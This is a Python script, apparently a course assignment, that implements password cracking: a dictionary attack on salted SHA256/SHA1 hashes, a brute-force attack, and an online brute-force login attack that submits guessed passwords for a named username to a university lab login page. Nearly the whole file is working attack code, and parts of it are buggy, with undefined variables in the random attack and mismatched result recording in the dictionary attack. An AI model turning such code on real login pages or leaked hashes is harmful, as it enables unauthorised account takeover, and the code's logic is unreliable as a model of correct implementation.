#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Gerardo Armenta 
# 02-25-2021
# Dictionary, random and online password cracking. Includes SHA1 and SHA256 hash encryption.
# Sources geeksforgeeks.com github.com/AllenDowny 

import hashlib
import itertools
import time
import mechanicalsoup
from requests import Session
import urllib.request
from timeit import default_timer as timer


# applies hash encoding
def hashing1(pw):
    return hashlib.sha1(pw.encode()).hexdigest()

# applies hash256 encoding
def hashing256(pw):
    return hashlib.sha256(pw.encode()).hexdigest()

# reads vocabulary list and accounts to place them in a list and dictionary accordingly.
def dictionary_reader():
    words = open("wordsEn.txt", "r").readlines()
    accts = open("accounts_dictionary.txt", "r")
    salts = []
    wrd = []
    salt_of_pw = {}
    salted_pw = {}
    
    # places username, salt, and hashed password into a list of lists
    with accts as f:
        for line in f:
            salts.append([str for str in line.split()])

    # places the username and salt and the username and password in dictionaries
    for i in range(len(salts)):
        salt_of_pw.update({salts[i][0]: salts[i][1]})
        salted_pw.update({salts[i][0]: salts[i][2]})

    # places the vocabulary list into a list
    for line in words:    
        wrd.append(line)
    
    return salt_of_pw, salted_pw, wrd

# makes dictionary attack
def dictionary_attack():
    start = timer()
    salt, pw, wrd = dictionary_reader()
    cracked_passwords = open("Cracked_Passwords_Dictionary.txt", "w+")
    password_match = []*1

    for value in salt:
        for w in wrd:
            w = w.rstrip('\n')
            hashed256 = hashing256(w + salt[value])
            hashed1 = hashing1(hashed256)
            if (hashed1 == pw[value]):
                password_match.append([pw.keys(), w])
    
    # writes username and passwords that were found to Cracked_Passwords.txt
    row = 0
    for k, v in pw.items():
        cracked_passwords.write(k + "  :  " + password_match[row][1] + "\n")
        row += 1
    
    end = timer()
    t = end - start
    t = str(t)
    cracked_passwords.write("\nThe dictionary attack took:  " + t + "seconds.")
    cracked_passwords.close()

# reads files for random attack
def random_reader():
    file = open("accounts_random.txt", "r")
    usr = []

    with file as f:
        for line in f:
            # usr.append([str for str in line.split()])
            usr.append(line.split())
            print(usr[0][1])
    return usr

# Generates all possible combinations of different chars in the alphabet.
def random_characters():
    char_list = "bluy"
    password_list = []*1
    bad_char = ["(", "'", ")", ",", " "]
    
    # Creates all possible combinations from the alphabet from length 1 to 10.
    # Just run one and comment all the others out when running.
    # Running all of them will eat up all memory and force quit.
    # pw1 = itertools.combinations(char_list, 1)
    # pw2 = itertools.product(char_list, repeat = 2)
    # pw3 = itertools.product(char_list, repeat = 3)
    pw4 = itertools.product(char_list, repeat = 4)
    # pw5 = itertools.product(char_list, repeat = 5)
    # pw6 = itertools.product(char_list, repeat = 6)
    # pw7 = itertools.product(char_list, repeat = 7)
    # pw8 = itertools.product(char_list, repeat = 8)
    # pw9 = itertools.product(char_list, repeat = 9)
    # pw10 = itertools.product(char_list, repeat = 10)

    # Concatinates all of the combinations into one variable.
    # Comment out when running just one from the pw1 to pw10.
    # pw = itertools.chain(pw1, pw2, pw3, pw4, pw5, pw6, pw7, pw8, pw9, pw10)
    
    # gets the combinations and encrypts each of them into a 2d list with the word and encryption.
    for j in pw4:
        j = str(j)
        j = "".join(i for i in j if not i in bad_char)
        w = hashing256(j)
        h = hashing1(w)
        password_list.append([j, h])

    return password_list

# makes random attack
def random_attack():
    start = timer()
    cracked_accounts = open("Cracked_Passwords_Random.txt", "w+")
    passwords = random_characters()
    users = random_reader()

    # print(user[0][0])

    # compares encrypted passwords with combination characters for a match
    for i in range(len(users)):
        for j in range(len(passwords)):
            print(users[i][1], " : ", passwords[j][1]) 
            if users[i][1] == passwords[j][1]:  
                print(users[i][0], " : ", password[j][0])         
                cracked_accounts.write(user[i][0], " : ", password[j][0])        # writes to text file the username and password.
    end = timer()
    t = end - start
    t = str(t)
    cracked_accounts.write("\nThe random attack took:  " + t + "seconds.")
    cracked_accounts.close()

# makes online attack
def online_attack():
    online_pw = open("Cracked_Passwords_Online.txt", ("w+"))
    char_list = "abcdefghijklmnopqrstuvwxyz"
    browser = mechanicalsoup.StatefulBrowser()
    url = "https://cssrvlab01.utep.edu/Classes/cs5339/longpre/cs5352/loginScreen.php"     
    webpage = browser.open(url)         # opens website
    usern = "jonathan2_-9nz"
    passw = ""
    login = "login was not successful"

    # makes a list of all possible 2 character combination
    password = itertools.product(char_list, repeat = 2)
    pw = [''.join(a) for a in password]
    start = timer()

    # traverses list with all possible 2 char combination and submits them with the username to the website
    for x in pw:
        login_status = ""
        browser.select_form()
        browser["un"] = "jonathan2_-9nz"
        browser["pw"] = str(x)
        response = browser.submit_selected()        # submits the login information
        resp = str(response.text)
        for i in range(2, 26):          # gets the first 26 charcters from the response
            login_status += resp[i]
        if login != login_status:       # compares login with the response
            passw = x
            break
        time.sleep(1)           # 1 second delay to not flood the server
    end = timer()
    t = end - start
    t = str(t)
    online_pw.write("username = " + usern + "\n" + "password = " + passw + "\n\nTook " + t + "seconds.")
    online_pw.close()

def main():
    dict_start = timer()
    # dictionary_attack()
    dict_end = timer()
    rand_start = timer()
    random_attack()
    rand_end = timer()
    online_start = timer()
    # online_attack()
    online_end = timer()
    td = dict_end - dict_start
    td = str(td)
    tr = rand_end - rand_start
    tr = str(tr)
    to = online_end - online_start
    to = str(to)
    print("The dictionary attack took: " + td + "seconds." + "\n\nThe random attack took: " + tr + "seconds." + "\n\nThe online attack took: " + to + "seconds.")

if __name__ == "__main__":
    main()